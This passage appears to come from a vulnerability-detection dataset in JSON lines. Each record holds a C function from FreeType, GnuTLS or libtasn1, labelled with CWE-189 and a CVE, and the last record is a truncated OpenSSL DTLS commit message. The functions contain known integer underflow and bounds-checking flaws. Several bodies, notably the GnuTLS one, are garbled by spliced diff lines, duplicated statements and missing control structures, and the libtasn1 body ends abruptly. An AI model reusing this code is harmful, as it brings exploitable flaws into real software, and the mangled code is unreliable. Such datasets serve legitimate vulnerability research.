hhcurveto\\n\" ));\n\n            if ( num_args < 4 )\n              goto Stack_Underflow;\n\n            /* if num_args isn't of the form 4n or 4n+1, */\n            /* we reduce it to 4n+1                      */\n\n            nargs = num_args - num_args % 4;\n            if ( num_args - nargs > 0 )\n              nargs += 1;\n\n            if ( cff_builder_start_point( builder, x, y ) )\n              goto Fail;\n\n            args -= nargs;\n            if ( nargs & 1 )\n            {\n              y += args[0];\n              args++;\n              nargs--;\n            }\n\n            if ( check_points( builder, 3 * ( nargs / 4 ) ) )\n              goto Fail;\n\n            while ( args < decoder->top )\n            {\n              x += args[0];\n              cff_builder_add_point( builder, x, y, 0 );\n              x += args[1];\n              y += args[2];\n              cff_builder_add_point( builder, x, y, 0 );\n              x += args[3];\n              cff_builder_add_point( builder, x, y, 1 );\n              args += 4;\n            }\n            args = stack;\n          }\n          break;\n\n        case cff_op_vhcurveto:\n        case cff_op_hvcurveto:\n          {\n            FT_Int  phase;\n            FT_Int  nargs;\n\n\n            FT_TRACE4(( op == cff_op_vhcurveto ? \" vhcurveto\\n\"\n                                               : \" hvcurveto\\n\" ));\n\n            if ( cff_builder_start_point( builder, x, y ) )\n              goto Fail;\n\n            if ( num_args < 4 )\n              goto Stack_Underflow;\n\n            /* if num_args isn't of the form 8n, 8n+1, 8n+4, or 8n+5, */\n            /* we reduce it to the largest one which fits             */\n\n            nargs = num_args - num_args % 4;\n            if ( num_args - nargs > 0 )\n              nargs += 1;\n\n            args -= nargs;\n            if ( check_points( builder, ( nargs / 4 ) * 3 ) )\n              goto Stack_Underflow;\n\n            phase = ( op == cff_op_hvcurveto );\n\n            while ( nargs >= 4 )\n            {\n              nargs -= 4;\n              if ( phase )\n              {\n                x += args[0];\n                cff_builder_add_point( builder, x, y, 0 );\n                x += args[1];\n                y += args[2];\n                cff_builder_add_point( builder, x, y, 0 );\n                y += args[3];\n                if ( nargs == 1 )\n                  x += args[4];\n                cff_builder_add_point( builder, x, y, 1 );\n              }\n              else\n              {\n                y += args[0];\n                cff_builder_add_point( builder, x, y, 0 );\n                x += args[1];\n                y += args[2];\n                cff_builder_add_point( builder, x, y, 0 );\n                x += args[3];\n                if ( nargs == 1 )\n                  y += args[4];\n                cff_builder_add_point( builder, x, y, 1 );\n              }\n              args  += 4;\n              phase ^= 1;\n            }\n            args = stack;\n          }\n          break;\n\n        case cff_op_rlinecurve:\n          {\n            FT_Int  num_lines;\n            FT_Int  nargs;\n\n\n            FT_TRACE4(( \" rlinecurve\\n\" ));\n\n            if ( num_args < 8 )\n              goto Stack_Underflow;\n\n            nargs     = num_args & ~1;\n            num_lines = ( nargs - 6 ) / 2;\n\n            if ( cff_builder_start_point( builder, x, y ) ||\n                 check_points( builder, num_lines + 3 )   )\n              goto Fail;\n\n            args -= nargs;\n\n            /* first, add the line segments */\n            while ( num_lines > 0 )\n            {\n              x += args[0];\n              y += args[1];\n              cff_builder_add_point( builder, x, y, 1 );\n              args += 2;\n              num_lines--;\n            }\n\n            /* then the curve */\n            x += args[0];\n            y += args[1];\n            cff_builder_add_point( builder, x, y, 0 );\n            x += args[2];\n            y += args[3];\n            cff_builder_add_point( builder, x, y, 0 );\n            x += args[4];\n            y += args[5];\n            cff_builder_add_point( builder, x, y, 1 );\n            args = stack;\n          }\n          break;\n\n        case cff_op_rcurveline:\n          {\n            FT_Int  num_curves;\n            FT_Int  nargs;\n\n\n            FT_TRACE4(( \" rcurveline\\n\" ));\n\n            if ( num_args < 8 )\n              goto Stack_Underflow;\n\n            nargs      = num_args - 2;\n            nargs      = nargs - nargs % 6 + 2;\n            num_curves = ( nargs - 2 ) / 6;\n\n            if ( cff_builder_start_point ( builder, x, y ) ||\n                 check_points( builder, num_curves * 3 + 2 ) )\n              goto Fail;\n\n            args -= nargs;\n\n            /* first, add the curves */\n            while ( num_curves > 0 )\n            {\n              x += args[0];\n              y += args[1];\n              cff_builder_add_point( builder, x, y, 0 );\n              x += args[2];\n              y += args[3];\n              cff_builder_add_point( builder, x, y, 0 );\n              x += args[4];\n              y += args[5];\n              cff_builder_add_point( builder, x, y, 1 );\n              args += 6;\n              num_curves--;\n            }\n\n            /* then the final line */\n            x += args[0];\n            y += args[1];\n            cff_builder_add_point( builder, x, y, 1 );\n            args = stack;\n          }\n          break;\n\n        case cff_op_hflex1:\n          {\n            FT_Pos start_y;\n\n\n            FT_TRACE4(( \" hflex1\\n\" ));\n\n            /* adding five more points: 4 control points, 1 on-curve point */\n            /* -- make sure we have enough space for the start point if it */\n            /* needs to be added                                           */\n            if ( cff_builder_start_point( builder, x, y ) ||\n                 check_points( builder, 6 )               )\n              goto Fail;\n\n            /* record the starting point's y position for later use */\n            start_y = y;\n\n            /* first control point */\n            x += args[0];\n            y += args[1];\n            cff_builder_add_point( builder, x, y, 0 );\n\n            /* second control point */\n            x += args[2];\n            y += args[3];\n            cff_builder_add_point( builder, x, y, 0 );\n\n            /* join point; on curve, with y-value the same as the last */\n            /* control point's y-value                                 */\n            x += args[4];\n            cff_builder_add_point( builder, x, y, 1 );\n\n            /* third control point, with y-value the same as the join */\n            /* point's y-value                                        */\n            x += args[5];\n            cff_builder_add_point( builder, x, y, 0 );\n\n            /* fourth control point */\n            x += args[6];\n            y += args[7];\n            cff_builder_add_point( builder, x, y, 0 );\n\n            /* ending point, with y-value the same as the start   */\n            x += args[8];\n            y  = start_y;\n            cff_builder_add_point( builder, x, y, 1 );\n\n            args = stack;\n            break;\n          }\n\n        case cff_op_hflex:\n          {\n            FT_Pos start_y;\n\n\n            FT_TRACE4(( \" hflex\\n\" ));\n\n            /* adding six more points; 4 control points, 2 on-curve points */\n            if ( cff_builder_start_point( builder, x, y ) ||\n                 check_points( builder, 6 )               )\n              goto Fail;\n\n            /* record the starting point's y-position for later use */\n            start_y = y;\n\n            /* first control point */\n            x += args[0];\n            cff_builder_add_point( builder, x, y, 0 );\n\n            /* second control point */\n            x += args[1];\n            y += args[2];\n            cff_builder_add_point( builder, x, y, 0 );\n\n            /* join point; on curve, with y-value the same as the last */\n            /* control point's y-value                                 */\n            x += args[3];\n            cff_builder_add_point( builder, x, y, 1 );\n\n            /* third control point, with y-value the same as the join */\n            /* point's y-value                                        */\n            x += args[4];\n            cff_builder_add_point( builder, x, y, 0 );\n\n            /* fourth control point */\n            x += args[5];\n            y  = start_y;\n            cff_builder_add_point( builder, x, y, 0 );\n\n            /* ending point, with y-value the same as the start point's */\n            /* y-value -- we don't add this point, though               */\n            x += args[6];\n            cff_builder_add_point( builder, x, y, 1 );\n\n            args = stack;\n            break;\n          }\n\n        case cff_op_flex1:\n          {\n            FT_Pos     start_x, start_y; /* record start x, y values for */\n                                         /* alter use                    */\n            FT_Fixed   dx = 0, dy = 0;   /* used in horizontal/vertical  */\n                                         /* algorithm below              */\n            FT_Int     horizontal, count;\n            FT_Fixed*  temp;\n\n\n            FT_TRACE4(( \" flex1\\n\" ));\n\n            /* adding six more points; 4 control points, 2 on-curve points */\n            if ( cff_builder_start_point( builder, x, y ) ||\n                 check_points( builder, 6 )               )\n              goto Fail;\n\n            /* record the starting point's x, y position for later use */\n            start_x = x;\n            start_y = y;\n\n            /* XXX: figure out whether this is supposed to be a horizontal */\n            /*      or vertical flex; the Type 2 specification is vague... */\n\n            temp = args;\n\n            /* grab up to the last argument */\n            for ( count = 5; count > 0; count-- )\n            {\n              dx += temp[0];\n              dy += temp[1];\n              temp += 2;\n            }\n\n            if ( dx < 0 )\n              dx = -dx;\n            if ( dy < 0 )\n              dy = -dy;\n\n            /* strange test, but here it is... */\n            horizontal = ( dx > dy );\n\n            for ( count = 5; count > 0; count-- )\n            {\n              x += args[0];\n              y += args[1];\n              cff_builder_add_point( builder, x, y,\n                                     (FT_Bool)( count == 3 ) );\n              args += 2;\n            }\n\n            /* is last operand an x- or y-delta? */\n            if ( horizontal )\n            {\n              x += args[0];\n              y  = start_y;\n            }\n            else\n            {\n              x  = start_x;\n              y += args[0];\n            }\n\n            cff_builder_add_point( builder, x, y, 1 );\n\n            args = stack;\n            break;\n           }\n\n        case cff_op_flex:\n          {\n            FT_UInt  count;\n\n\n            FT_TRACE4(( \" flex\\n\" ));\n\n            if ( cff_builder_start_point( builder, x, y ) ||\n                 check_points( builder, 6 )               )\n              goto Fail;\n\n            for ( count = 6; count > 0; count-- )\n            {\n              x += args[0];\n              y += args[1];\n              cff_builder_add_point( builder, x, y,\n                                     (FT_Bool)( count == 4 || count == 1 ) );\n              args += 2;\n            }\n\n            args = stack;\n          }\n          break;\n\n        case cff_op_seac:\n            FT_TRACE4(( \" seac\\n\" ));\n\n            error = cff_operator_seac( decoder,\n                                       args[0], args[1], args[2],\n                                       (FT_Int)( args[3] >> 16 ),\n                                       (FT_Int)( args[4] >> 16 ) );\n\n            /* add current outline to the glyph slot */\n            FT_GlyphLoader_Add( builder->loader );\n\n            /* return now! */\n            FT_TRACE4(( \"\\n\" ));\n            return error;\n\n        case cff_op_endchar:\n          FT_TRACE4(( \" endchar\\n\" ));\n\n          /* We are going to emulate the seac operator. */\n          if ( num_args >= 4 )\n          {\n            /* Save glyph width so that the subglyphs don't overwrite it. */\n            FT_Pos  glyph_width = decoder->glyph_width;\n\n            error = cff_operator_seac( decoder,\n                                       0L, args[-4], args[-3],\n                                       (FT_Int)( args[-2] >> 16 ),\n                                       (FT_Int)( args[-1] >> 16 ) );\n\n            decoder->glyph_width = glyph_width;\n          }\n          else\n          {\n            if ( !error )\n              error = CFF_Err_Ok;\n\n            cff_builder_close_contour( builder );\n\n            /* close hints recording session */\n            if ( hinter )\n            {\n              if ( hinter->close( hinter->hints,\n                                  builder->current->n_points ) )\n                goto Syntax_Error;\n\n              /* apply hints to the loaded glyph outline now */\n              hinter->apply( hinter->hints,\n                             builder->current,\n                             (PSH_Globals)builder->hints_globals,\n                             decoder->hint_mode );\n            }\n\n            /* add current outline to the glyph slot */\n            FT_GlyphLoader_Add( builder->loader );\n          }\n\n          /* return now! */\n          FT_TRACE4(( \"\\n\" ));\n          return error;\n\n        case cff_op_abs:\n          FT_TRACE4(( \" abs\\n\" ));\n\n          if ( args[0] < 0 )\n            args[0] = -args[0];\n          args++;\n          break;\n\n        case cff_op_add:\n          FT_TRACE4(( \" add\\n\" ));\n\n          args[0] += args[1];\n          args++;\n          break;\n\n        case cff_op_sub:\n          FT_TRACE4(( \" sub\\n\" ));\n\n          args[0] -= args[1];\n          args++;\n          break;\n\n        case cff_op_div:\n          FT_TRACE4(( \" div\\n\" ));\n\n          args[0] = FT_DivFix( args[0], args[1] );\n          args++;\n          break;\n\n        case cff_op_neg:\n          FT_TRACE4(( \" neg\\n\" ));\n\n          args[0] = -args[0];\n          args++;\n          break;\n\n        case cff_op_random:\n          {\n            FT_Fixed  Rand;\n\n\n            FT_TRACE4(( \" rand\\n\" ));\n\n            Rand = seed;\n            if ( Rand >= 0x8000L )\n              Rand++;\n\n            args[0] = Rand;\n            seed    = FT_MulFix( seed, 0x10000L - seed );\n            if ( seed == 0 )\n              seed += 0x2873;\n            args++;\n          }\n          break;\n\n        case cff_op_mul:\n          FT_TRACE4(( \" mul\\n\" ));\n\n          args[0] = FT_MulFix( args[0], args[1] );\n          args++;\n          break;\n\n        case cff_op_sqrt:\n          FT_TRACE4(( \" sqrt\\n\" ));\n\n          if ( args[0] > 0 )\n          {\n            FT_Int    count = 9;\n            FT_Fixed  root  = args[0];\n            FT_Fixed  new_root;\n\n\n            for (;;)\n            {\n              new_root = ( root + FT_DivFix( args[0], root ) + 1 ) >> 1;\n              if ( new_root == root || count <= 0 )\n                break;\n              root = new_root;\n            }\n            args[0] = new_root;\n          }\n          else\n            args[0] = 0;\n          args++;\n          break;\n\n        case cff_op_drop:\n          /* nothing */\n          FT_TRACE4(( \" drop\\n\" ));\n\n          break;\n\n        case cff_op_exch:\n          {\n            FT_Fixed  tmp;\n\n\n            FT_TRACE4(( \" exch\\n\" ));\n\n            tmp     = args[0];\n            args[0] = args[1];\n            args[1] = tmp;\n            args   += 2;\n          }\n          break;\n\n        case cff_op_index:\n          {\n            FT_Int  idx = (FT_Int)( args[0] >> 16 );\n\n\n            FT_TRACE4(( \" index\\n\" ));\n\n            if ( idx < 0 )\n              idx = 0;\n            else if ( idx > num_args - 2 )\n              idx = num_args - 2;\n            args[0] = args[-( idx + 1 )];\n            args++;\n          }\n          break;\n\n        case cff_op_roll:\n          {\n            FT_Int  count = (FT_Int)( args[0] >> 16 );\n            FT_Int  idx   = (FT_Int)( args[1] >> 16 );\n\n\n            FT_TRACE4(( \" roll\\n\" ));\n\n            if ( count <= 0 )\n              count = 1;\n\n            args -= count;\n            if ( args < stack )\n              goto Stack_Underflow;\n\n            if ( idx >= 0 )\n            {\n              while ( idx > 0 )\n              {\n                FT_Fixed  tmp = args[count - 1];\n                FT_Int    i;\n\n\n                for ( i = count - 2; i >= 0; i-- )\n                  args[i + 1] = args[i];\n                args[0] = tmp;\n                idx--;\n              }\n            }\n            else\n            {\n              while ( idx < 0 )\n              {\n                FT_Fixed  tmp = args[0];\n                FT_Int    i;\n\n\n                for ( i = 0; i < count - 1; i++ )\n                  args[i] = args[i + 1];\n                args[count - 1] = tmp;\n                idx++;\n              }\n            }\n            args += count;\n          }\n          break;\n\n        case cff_op_dup:\n          FT_TRACE4(( \" dup\\n\" ));\n\n          args[1] = args[0];\n          args += 2;\n          break;\n\n        case cff_op_put:\n          {\n            FT_Fixed  val = args[0];\n            FT_Int    idx = (FT_Int)( args[1] >> 16 );\n\n\n            FT_TRACE4(( \" put\\n\" ));\n\n            if ( idx >= 0 && idx < CFF_MAX_TRANS_ELEMENTS )\n              decoder->buildchar[idx] = val;\n          }\n          break;\n\n        case cff_op_get:\n          {\n            FT_Int    idx = (FT_Int)( args[0] >> 16 );\n            FT_Fixed  val = 0;\n\n\n            FT_TRACE4(( \" get\\n\" ));\n\n            if ( idx >= 0 && idx < CFF_MAX_TRANS_ELEMENTS )\n              val = decoder->buildchar[idx];\n\n            args[0] = val;\n            args++;\n          }\n          break;\n\n        case cff_op_store:\n          FT_TRACE4(( \" store\\n\"));\n\n          goto Unimplemented;\n\n        case cff_op_load:\n          FT_TRACE4(( \" load\\n\" ));\n\n          goto Unimplemented;\n\n        case cff_op_dotsection:\n          /* this operator is deprecated and ignored by the parser */\n          FT_TRACE4(( \" dotsection\\n\" ));\n          break;\n\n        case cff_op_closepath:\n          /* this is an invalid Type 2 operator; however, there        */\n          /* exist fonts which are incorrectly converted from probably */\n          /* Type 1 to CFF, and some parsers seem to accept it         */\n\n          FT_TRACE4(( \" closepath (invalid op)\\n\" ));\n\n          args = stack;\n          break;\n\n        case cff_op_hsbw:\n          /* this is an invalid Type 2 operator; however, there        */\n          /* exist fonts which are incorrectly converted from probably */\n          /* Type 1 to CFF, and some parsers seem to accept it         */\n\n          FT_TRACE4(( \" hsbw (invalid op)\\n\" ));\n\n          decoder->glyph_width = decoder->nominal_width + ( args[1] >> 16 );\n\n          decoder->builder.left_bearing.x = args[0];\n          decoder->builder.left_bearing.y = 0;\n\n          x    = decoder->builder.pos_x + args[0];\n          y    = decoder->builder.pos_y;\n          args = stack;\n          break;\n\n        case cff_op_sbw:\n          /* this is an invalid Type 2 operator; however, there        */\n          /* exist fonts which are incorrectly converted from probably */\n          /* Type 1 to CFF, and some parsers seem to accept it         */\n\n          FT_TRACE4(( \" sbw (invalid op)\\n\" ));\n\n          decoder->glyph_width = decoder->nominal_width + ( args[2] >> 16 );\n\n          decoder->builder.left_bearing.x = args[0];\n          decoder->builder.left_bearing.y = args[1];\n\n          x    = decoder->builder.pos_x + args[0];\n          y    = decoder->builder.pos_y + args[1];\n          args = stack;\n          break;\n\n        case cff_op_setcurrentpoint:\n          /* this is an invalid Type 2 operator; however, there        */\n          /* exist fonts which are incorrectly converted from probably */\n          /* Type 1 to CFF, and some parsers seem to accept it         */\n\n          FT_TRACE4(( \" setcurrentpoint (invalid op)\\n\" ));\n\n          x    = decoder->builder.pos_x + args[0];\n          y    = decoder->builder.pos_y + args[1];\n          args = stack;\n          break;\n\n        case cff_op_callothersubr:\n          /* this is an invalid Type 2 operator; however, there        */\n          /* exist fonts which are incorrectly converted from probably */\n          /* Type 1 to CFF, and some parsers seem to accept it         */\n\n          FT_TRACE4(( \" callothersubr (invalid op)\\n\" ));\n\n          /* subsequent `pop' operands should add the arguments,       */\n           /* this is the implementation described for `unknown' other  */\n           /* subroutines in the Type1 spec.                            */\n           args -= 2 + ( args[-2] >> 16 );\n          if ( args < stack )\n            goto Stack_Underflow;\n           break;\n \n         case cff_op_pop:\n          /* Type 1 to CFF, and some parsers seem to accept it         */\n\n          FT_TRACE4(( \" pop (invalid op)\\n\" ));\n\n          args++;\n          break;\n\n        case cff_op_and:\n          {\n            FT_Fixed  cond = args[0] && args[1];\n\n\n            FT_TRACE4(( \" and\\n\" ));\n\n            args[0] = cond ? 0x10000L : 0;\n            args++;\n          }\n          break;\n\n        case cff_op_or:\n          {\n            FT_Fixed  cond = args[0] || args[1];\n\n\n            FT_TRACE4(( \" or\\n\" ));\n\n            args[0] = cond ? 0x10000L : 0;\n            args++;\n          }\n          break;\n\n        case cff_op_eq:\n          {\n            FT_Fixed  cond = !args[0];\n\n\n            FT_TRACE4(( \" eq\\n\" ));\n\n            args[0] = cond ? 0x10000L : 0;\n            args++;\n          }\n          break;\n\n        case cff_op_ifelse:\n          {\n            FT_Fixed  cond = ( args[2] <= args[3] );\n\n\n            FT_TRACE4(( \" ifelse\\n\" ));\n\n            if ( !cond )\n              args[0] = args[1];\n            args++;\n          }\n          break;\n\n        case cff_op_callsubr:\n          {\n            FT_UInt  idx = (FT_UInt)( ( args[0] >> 16 ) +\n                                      decoder->locals_bias );\n\n\n            FT_TRACE4(( \" callsubr(%d)\\n\", idx ));\n\n            if ( idx >= decoder->num_locals )\n            {\n              FT_ERROR(( \"cff_decoder_parse_charstrings:\"\n                         \" invalid local subr index\\n\" ));\n              goto Syntax_Error;\n            }\n\n            if ( zone - decoder->zones >= CFF_MAX_SUBRS_CALLS )\n            {\n              FT_ERROR(( \"cff_decoder_parse_charstrings:\"\n                         \" too many nested subrs\\n\" ));\n              goto Syntax_Error;\n            }\n\n            zone->cursor = ip;  /* save current instruction pointer */\n\n            zone++;\n            zone->base   = decoder->locals[idx];\n            zone->limit  = decoder->locals[idx + 1];\n            zone->cursor = zone->base;\n\n            if ( !zone->base || zone->limit == zone->base )\n            {\n              FT_ERROR(( \"cff_decoder_parse_charstrings:\"\n                         \" invoking empty subrs\\n\" ));\n              goto Syntax_Error;\n            }\n\n            decoder->zone = zone;\n            ip            = zone->base;\n            limit         = zone->limit;\n          }\n          break;\n\n        case cff_op_callgsubr:\n          {\n            FT_UInt  idx = (FT_UInt)( ( args[0] >> 16 ) +\n                                      decoder->globals_bias );\n\n\n            FT_TRACE4(( \" callgsubr(%d)\\n\", idx ));\n\n            if ( idx >= decoder->num_globals )\n            {\n              FT_ERROR(( \"cff_decoder_parse_charstrings:\"\n                         \" invalid global subr index\\n\" ));\n              goto Syntax_Error;\n            }\n\n            if ( zone - decoder->zones >= CFF_MAX_SUBRS_CALLS )\n            {\n              FT_ERROR(( \"cff_decoder_parse_charstrings:\"\n                         \" too many nested subrs\\n\" ));\n              goto Syntax_Error;\n            }\n\n            zone->cursor = ip;  /* save current instruction pointer */\n\n            zone++;\n            zone->base   = decoder->globals[idx];\n            zone->limit  = decoder->globals[idx + 1];\n            zone->cursor = zone->base;\n\n            if ( !zone->base || zone->limit == zone->base )\n            {\n              FT_ERROR(( \"cff_decoder_parse_charstrings:\"\n                         \" invoking empty subrs\\n\" ));\n              goto Syntax_Error;\n            }\n\n            decoder->zone = zone;\n            ip            = zone->base;\n            limit         = zone->limit;\n          }\n          break;\n\n        case cff_op_return:\n          FT_TRACE4(( \" return\\n\" ));\n\n          if ( decoder->zone <= decoder->zones )\n          {\n            FT_ERROR(( \"cff_decoder_parse_charstrings:\"\n                       \" unexpected return\\n\" ));\n            goto Syntax_Error;\n          }\n\n          decoder->zone--;\n          zone  = decoder->zone;\n          ip    = zone->cursor;\n          limit = zone->limit;\n          break;\n\n        default:\n        Unimplemented:\n          FT_ERROR(( \"Unimplemented opcode: %d\", ip[-1] ));\n\n          if ( ip[-1] == 12 )\n            FT_ERROR(( \" %d\", ip[0] ));\n          FT_ERROR(( \"\\n\" ));\n\n          return CFF_Err_Unimplemented_Feature;\n        }\n\n      decoder->top = args;\n\n      } /* general operator processing */\n\n    } /* while ip < limit */\n\n    FT_TRACE4(( \"..end..\\n\\n\" ));\n\n  Fail:\n    return error;\n\n  Syntax_Error:\n    FT_TRACE4(( \"cff_decoder_parse_charstrings: syntax error\\n\" ));\n    return CFF_Err_Invalid_File_Format;\n\n  Stack_Underflow:\n    FT_TRACE4(( \"cff_decoder_parse_charstrings: stack underflow\\n\" ));\n    return CFF_Err_Too_Few_Arguments;\n\n  Stack_Overflow:\n    FT_TRACE4(( \"cff_decoder_parse_charstrings: stack overflow\\n\" ));\n    return CFF_Err_Stack_Overflow;\n  }\n", "func_hash": 338965105723107567424020450442881213658, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2010-2497", "cve_desc": "Integer underflow in glyph handling in FreeType before 2.4.0 allows remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted font file.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2010-2497"}
{"idx": 158208, "project": "savannah", "commit_id": "bc8102405fda11ea00ca3b42acc4f4bce9d6e97b", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls.git;a=commitdiff;h=bc8102405fda11ea00ca3b42acc4f4bce9d6e97b", "commit_message": "None", "target": 0, "func": "_gnutls_ciphertext2compressed (gnutls_session_t session,\n\t\t\t       opaque * compress_data,\n\t\t\t       int compress_size,\n\t\t\t       gnutls_datum_t ciphertext, uint8_t type)\n{\n  uint8_t MAC[MAX_HASH_SIZE];\n  uint16_t c_length;\n  uint8_t pad;\n  int length;\n  digest_hd_st td;\n  uint16_t blocksize;\n  int ret, i, pad_failed = 0;\n  uint8_t major, minor;\n  gnutls_protocol_t ver;\n  int hash_size =\n    _gnutls_hash_get_algo_len (session->security_parameters.\n\t\t\t       read_mac_algorithm);\n\n  ver = gnutls_protocol_get_version (session);\n  minor = _gnutls_version_get_minor (ver);\n  major = _gnutls_version_get_major (ver);\n\n  blocksize = _gnutls_cipher_get_block_size (session->security_parameters.\n\t\t\t\t\t     read_bulk_cipher_algorithm);\n\n  /* initialize MAC \n   */\n  ret = mac_init (&td, session->security_parameters.read_mac_algorithm,\n\t\t session->connection_state.read_mac_secret.data,\n\t\t session->connection_state.read_mac_secret.size, ver);\n\n  if (ret < 0\n      && session->security_parameters.read_mac_algorithm != GNUTLS_MAC_NULL)\n    {\n      gnutls_assert ();\n       return GNUTLS_E_INTERNAL_ERROR;\n     }\n \n  if (ciphertext.size < (unsigned) blocksize + hash_size)\n    {\n      _gnutls_record_log\n       (\"REC[%x]: Short record length %d < %d + %d (under attack?)\\n\",\n        session, ciphertext.size, blocksize, hash_size);\n      gnutls_assert ();\n      return GNUTLS_E_DECRYPTION_FAILED;\n    }\n \n   /* actual decryption (inplace)\n    */\n\t{\n\t  gnutls_assert ();\n\t  return ret;\n\t}\n\n      length = ciphertext.size - hash_size;\n\n      break;\n    case CIPHER_BLOCK:\n      if ((ciphertext.size < blocksize) || (ciphertext.size % blocksize != 0))\n\t{\n\t  gnutls_assert ();\n\t  return GNUTLS_E_DECRYPTION_FAILED;\n\t}\n\n      if ((ret = _gnutls_cipher_decrypt (&session->connection_state.\n\t\t\t\t\t read_cipher_state,\n\t\t\t\t\t ciphertext.data,\n\t\t\t\t\t ciphertext.size)) < 0)\n\t{\n\t  gnutls_assert ();\n\t  return ret;\n\t}\n\n      /* ignore the IV in TLS 1.1.\n       */\n      if (session->security_parameters.version >= GNUTLS_TLS1_1)\n\t{\n\t  ciphertext.size -= blocksize;\n\t  ciphertext.data += blocksize;\n\n\t  if (ciphertext.size == 0)\n\t    {\n\t      gnutls_assert ();\n\t      return GNUTLS_E_DECRYPTION_FAILED;\n\t    }\n\t}\n\n      pad = ciphertext.data[ciphertext.size - 1] + 1;\t/* pad */\n\n      length = ciphertext.size - hash_size - pad;\n\n      if (pad > ciphertext.size - hash_size)\n\t{\n\t  gnutls_assert ();\n \n       pad = ciphertext.data[ciphertext.size - 1] + 1;  /* pad */\n \n      if ((int)pad > (int)ciphertext.size - hash_size)\n        {\n          gnutls_assert ();\n          /* We do not fail here. We check below for the\n       */\n      if (ver >= GNUTLS_TLS1 && pad_failed == 0)\n          pad_failed = GNUTLS_E_DECRYPTION_FAILED;\n        }\n \n      length = ciphertext.size - hash_size - pad;\n\n       /* Check the pading bytes (TLS 1.x)\n        */\n       if (ver >= GNUTLS_TLS1 && pad_failed == 0)\n      gnutls_assert ();\n      return GNUTLS_E_INTERNAL_ERROR;\n    }\n\n  if (length < 0)\n    length = 0;\n  c_length = _gnutls_conv_uint16 ((uint16_t) length);\n\n  /* Pass the type, version, length and compressed through\n   * MAC.\n   */\n  if (session->security_parameters.read_mac_algorithm != GNUTLS_MAC_NULL)\n    {\n      _gnutls_hmac (&td,\n\t\t    UINT64DATA (session->connection_state.\n\t\t\t\tread_sequence_number), 8);\n\n      _gnutls_hmac (&td, &type, 1);\n      if (ver >= GNUTLS_TLS1)\n\t{\t\t\t/* TLS 1.x */\n\t  _gnutls_hmac (&td, &major, 1);\n\t  _gnutls_hmac (&td, &minor, 1);\n\t}\n      _gnutls_hmac (&td, &c_length, 2);\n\n      if (length > 0)\n\t_gnutls_hmac (&td, ciphertext.data, length);\n\n      mac_deinit (&td, MAC, ver);\n    }\n\n  /* This one was introduced to avoid a timing attack against the TLS\n   * 1.0 protocol.\n   */\n  if (pad_failed != 0)\n    return pad_failed;\n\n  /* HMAC was not the same. \n   */\n  if (memcmp (MAC, &ciphertext.data[length], hash_size) != 0)\n    {\n      gnutls_assert ();\n      return GNUTLS_E_DECRYPTION_FAILED;\n    }\n\n  /* copy the decrypted stuff to compress_data.\n   */\n  if (compress_size < length)\n    {\n      gnutls_assert ();\n      return GNUTLS_E_DECOMPRESSION_FAILED;\n    }\n  memcpy (compress_data, ciphertext.data, length);\n\n  return length;\n}\n", "func_hash": 170442923019523630056599453695509609781, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2008-1950", "cve_desc": "Integer signedness error in the _gnutls_ciphertext2compressed function in lib/gnutls_cipher.c in libgnutls in GnuTLS before 2.2.4 allows remote attackers to cause a denial of service (buffer over-read and crash) via a certain integer value in the Random field in an encrypted Client Hello message within a TLS record with an invalid Record Length, which leads to an invalid cipher padding length, aka GNUTLS-SA-2008-1-3.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2008-1950"}
{"idx": 158228, "project": "savannah", "commit_id": "1c3ccb3e040bf13e342ee60bc23b21b97b11923f", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/cgit/libtasn1.git/commit/?id=1c3ccb3e040bf13e342ee60bc23b21b97b11923f", "commit_message": "None", "target": 0, "func": "asn1_get_bit_der (const unsigned char *der, int der_len,\n \t\t  int *ret_len, unsigned char *str, int str_size,\n \t\t  int *bit_len)\n {\n  int len_len = 0, len_byte;\n \n   if (der_len <= 0)\n     return ASN1_GENERIC_ERROR;\n  len_byte = asn1_get_length_der (der, der_len, &len_len) - 1;\n  if (len_byte < 0)\n    return ASN1_DER_ERROR;\n \n   *ret_len = len_byte + len_len + 1;\n   *bit_len = len_byte * 8 - der[len_len];\n  \n  if (*bit_len <= 0)\n    return ASN1_DER_ERROR;\n \n   if (str_size >= len_byte)\n     memcpy (str, der + len_len + 1, len_byte);\n    }\n", "func_hash": 42928484385091622601624425880801270847, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2014-3468", "cve_desc": "The asn1_get_bit_der function in GNU Libtasn1 before 3.6 does not properly report an error when a negative bit length is identified, which allows context-dependent attackers to cause out-of-bounds access via crafted ASN.1 data.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-3468"}
{"idx": 158235, "project": "openssl", "commit_id": "1fb9fdc3027b27d8eb6a1e6a846435b070980770", "project_url": "https://github.com/openssl/openssl", "commit_url": "https://git.openssl.org/?p=openssl.git;a=commit;h=1fb9fdc3027b27d8eb6a1e6a846435b070980770", "commit_message": "Fix DTLS replay protection\n\nThe DTLS implementation provides some protection against replay attacks\nin accordance with RFC6347 section 4.1.2.6.\n\nA sliding \"window\" of valid record sequence numbers is maintained with\nthe \"right\" hand edge of the window set to the highest sequence number we\nhave received so far. Records that arrive that are off the \"left\" hand\nedge of the window are rejected. Records within the window are checked\nagainst a list of records received so far. If we already received it then\nwe also reject the new record.\n\nIf we have not already received the record, or the sequence number is off\nthe right hand edge of the window then we verify the MAC of the record.\nIf MAC verification fails then we discard the record. Otherwise we mark\nthe record as received. If the sequence number was off the right hand edge\nof the window, then we slide the window along so that the right hand edge\nis in line with the newly received sequence number.\n\nRecords may arrive for future epochs, i.e. a record from after a CCS being\nsent, can arrive before the CCS does if the packets get re-ordered. As we\nhave not yet received the CCS we are not yet in a position to decrypt or\nvalidate the MAC of those records. OpenSSL places those records on an\nunprocessed records queue. It additionally updates the window immediately,\neven though we have not yet verified the MAC. This will only occur if\ncurrently in a handshake/renegotiation.\n\nThis could be exploited by an attacker by sending a record for the next\nepoch (which does not have to decrypt or have a valid MAC), with a very\nlarge sequence number. This means the right hand edge of the window is\nmoved very far to the right, and all subsequent legitimate packets are\ndropped causing a denial of service.\n\nA similar effect can be achieved during the initial 